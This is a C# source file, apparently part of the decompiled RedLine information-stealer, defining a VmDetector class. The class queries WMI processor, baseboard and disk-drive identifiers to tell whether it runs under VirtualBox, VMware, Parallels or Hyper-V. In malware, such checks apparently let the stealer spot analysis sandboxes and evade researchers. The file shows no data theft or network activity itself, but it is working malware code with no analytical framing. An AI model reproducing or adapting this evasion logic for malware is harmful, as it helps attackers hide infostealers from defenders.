using RedLine.Models;
using RedLine.Models.WMI;
using System.Collections.ObjectModel;

namespace RedLine.Logic.Others
{
	public class VmDetector
	{
		private readonly IWmiService _wmiService;

		public VmDetector(IWmiService wmiService)
		{
			_wmiService = wmiService;
		}

		public MachineType GetMachineType()
		{
			WmiProcessor wmiProcessor = _wmiService.QueryFirst<WmiProcessor>(new WmiProcessorQuery());
			if (wmiProcessor.Manufacturer != null)
			{
				if (wmiProcessor.Manufacturer.Contains("VBoxVBoxVBox"))
				{
					return MachineType.VirtualBox;
				}
				if (wmiProcessor.Manufacturer.Contains("VMwareVMware"))
				{
					return MachineType.VMWare;
				}
				if (wmiProcessor.Manufacturer.Contains("prl hyperv"))
				{
					return MachineType.Parallels;
				}
			}
			WmiBaseBoard wmiBaseBoard = _wmiService.QueryFirst<WmiBaseBoard>(new WmiBaseBoardQuery());
			if (wmiBaseBoard.Manufacturer != null && wmiBaseBoard.Manufacturer.Contains("Microsoft Corporation"))
			{
				return MachineType.HyperV;
			}
			ReadOnlyCollection<WmiDiskDrive> readOnlyCollection = _wmiService.QueryAll<WmiDiskDrive>(new WmiDiskDriveQuery(), null);
			if (readOnlyCollection != null)
			{
				foreach (WmiDiskDrive item in readOnlyCollection)
				{
					if (item.PnpDeviceId.Contains("VBOX_HARDDISK"))
					{
						return MachineType.VirtualBox;
					}
					if (item.PnpDeviceId.Contains("VEN_VMWARE"))
					{
						return MachineType.VMWare;
					}
				}
			}
			return MachineType.Unknown;
		}
	}
}
